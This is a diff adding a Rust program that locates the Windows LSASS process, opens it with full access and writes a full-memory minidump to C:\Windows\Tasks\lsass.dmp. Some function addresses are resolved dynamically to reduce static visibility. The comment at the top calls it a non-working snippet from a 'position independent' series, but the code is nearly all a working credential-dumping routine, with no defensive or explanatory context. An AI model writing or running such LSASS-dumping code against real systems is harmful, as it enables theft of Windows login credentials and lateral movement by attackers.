@@ -1,0 +1,181 @@
+/*
+    My snippet code. This will not work. Fixing assp :).
+    This code is a part of Position independent series !  
+ */
+
+use std::{ffi::{CStr, CString, c_void}, ptr::null_mut};
+use std::os::raw::{c_char, c_ulong, c_int, c_uint};
+
+type HANDLE = *mut c_void;
+type BOOL = c_int;
+type DWORD = c_ulong;
+type LPDWORD = *mut DWORD;
+type LPVOID = *mut c_void;
+type CHAR = c_char;
+type LONG = i32;
+
+#[repr(C)]
+struct PROCESSENTRY32 {
+    dwSize: DWORD,
+    cntUsage: DWORD,
+    th32ProcessID: DWORD,
+    th32DefaultHeapID: usize,
+    th32ModuleID: DWORD,
+    cntThreads: DWORD,
+    th32ParentProcessID: DWORD,
+    pcPriClassBase: LONG,
+    dwFlags: DWORD,
+    szExeFile: [CHAR; 260],
+}
+
+const TH32CS_SNAPPROCESS: DWORD = 0x00000002;
+const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
+const FILE_GENERIC_WRITE: DWORD = 0x40000000;
+const FILE_SHARE_READ: DWORD = 0x00000001;
+const FILE_SHARE_WRITE: DWORD = 0x00000002;
+const CREATE_ALWAYS: DWORD = 2;
+const FILE_ATTRIBUTE_NORMAL: DWORD = 0x80;
+const MiniDumpWithFullMemory: DWORD = 0x00000002;
+
+extern "system" {
+    fn LoadLibraryA(lp_lib_file_name: *const CHAR) -> HANDLE;
+    fn GetProcAddress(h_module: HANDLE, lp_proc_name: *const CHAR) -> *const c_void;
+    fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) -> HANDLE;
+    fn Process32First(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32) -> BOOL;
+    fn Process32Next(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32) -> BOOL;
+}
+
+extern "system"{
+    fn OpenProcess(dw_desired_access: DWORD, b_inherit_handle: BOOL, dw_process_id: DWORD) -> HANDLE;
+}
+
+type OpenProcessFn = unsafe extern "system" fn(dw_desired_access: DWORD, b_inherit_handle: BOOL, dw_process_id: DWORD) -> HANDLE;
+type CreateFileAFn = unsafe extern "system" fn(
+    lp_file_name: *const CHAR,
+    dw_desired_access: DWORD,
+    dw_share_mode: DWORD,
+    lp_security_attributes: LPVOID,
+    dw_creation_disposition: DWORD,
+    dw_flags_and_attributes: DWORD,
+    h_template_file: HANDLE,
+) -> HANDLE;
+
+type MiniDumpWriteDumpFn = unsafe extern "system" fn(
+    h_process: HANDLE,
+    process_id: DWORD,
+    h_file: HANDLE,
+    dump_type: DWORD,
+    exception_param: LPVOID,
+    user_stream_param: LPVOID,
+    callback_param: LPVOID,
+) -> BOOL;
+
+type CloseHandleFn = unsafe extern "system" fn(h_object: HANDLE) -> BOOL;
+
+unsafe fn find_lsass() -> Result<DWORD, String> {
+    let h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if h_snapshot.is_null() {
+        return Err("Failed to create snapshot of processes".to_string());
+    }
+
+    let mut process_entry = PROCESSENTRY32 {
+        dwSize: std::mem::size_of::<PROCESSENTRY32>() as DWORD,
+        cntUsage: 0,
+        th32ProcessID: 0,
+        th32DefaultHeapID: 0,
+        th32ModuleID: 0,
+        cntThreads: 0,
+        th32ParentProcessID: 0,
+        pcPriClassBase: 0,
+        dwFlags: 0,
+        szExeFile: [0; 260],
+    };
+
+    if Process32First(h_snapshot, &mut process_entry) == 0 {
+        return Err("Failed to retrieve the first process".to_string());
+    }
+
+    loop {
+        let exe_name = CStr::from_ptr(process_entry.szExeFile.as_ptr()).to_string_lossy().into_owned();
+        if exe_name.to_lowercase() == "lsass.exe" {
+            println!("[i] LSASS process with PID found: {}", process_entry.th32ProcessID);
+            return Ok(process_entry.th32ProcessID);
+        }
+
+        if Process32Next(h_snapshot, &mut process_entry) == 0 {
+            break;
+        }
+    }
+
+    Err("Error finding lsass PID!".to_string())
+}
+
+fn main() {
+    unsafe {
+        let pid_lsass = find_lsass().unwrap_or_else(|e| {
+            panic!("[!] find_lsass Failed With Error: {e}");
+        });
+
+        let kernel32_str = CString::new("kernel32.dll").expect("Error");
+        let dbghelp_str = CString::new("Dbghelp.dll").expect("Error");
+
+        let kernel32 = LoadLibraryA(kernel32_str.as_ptr());
+        let dbghelp = LoadLibraryA(dbghelp_str.as_ptr());
+
+        if kernel32.is_null() || dbghelp.is_null() {
+            panic!("[!] Failed to load required DLLs.");
+        }
+
+        let (opn_proc_str, create_file_str, mini_dump_str, close_handle_str) = 
+            (
+                CString::new("OpenProcess").expect("Error"),
+                CString::new("CreateFileA").expect("Error"),
+                CString::new("MiniDumpWriteDump").expect("Error"),
+                CString::new("CloseHandle").expect("Error"),
+        );
+
+        let create_file_a: CreateFileAFn = std::mem::transmute(GetProcAddress(kernel32, create_file_str.as_ptr()));
+        let mini_dump_write_dump: MiniDumpWriteDumpFn = std::mem::transmute(GetProcAddress(dbghelp, mini_dump_str.as_ptr()));
+        let close_handle: CloseHandleFn = std::mem::transmute(GetProcAddress(kernel32, close_handle_str.as_ptr()));
+
+        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, false as BOOL, pid_lsass);
+        if hprocess.is_null() {
+            panic!("[!] OpenProcess Failed");
+        }
+
+        println!("[+] OpenProcess: {:?}", hprocess);
+        
+        let path = CString::new("C:\\Windows\\Tasks\\lsass.dmp").expect("CString::new failed");
+        let hfile = create_file_a(
+            path.as_ptr(),
+            FILE_GENERIC_WRITE,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            null_mut(),
+            CREATE_ALWAYS,
+            FILE_ATTRIBUTE_NORMAL,
+            null_mut(),
+        );
+        if hfile.is_null() {
+            panic!("[!] CreateFileA Failed");
+        }
+
+        let success = mini_dump_write_dump(
+            hprocess,
+            pid_lsass,
+            hfile,
+            MiniDumpWithFullMemory,
+            null_mut(),
+            null_mut(),
+            null_mut(),
+        );
+        if success == 0 {
+            panic!("[!] MiniDumpWriteDump Failed");
+        }
+
+        println!("[+] lsass dump successful!");
+
+        close_handle(hprocess);
+        close_handle(hfile);
+    }
+}
+
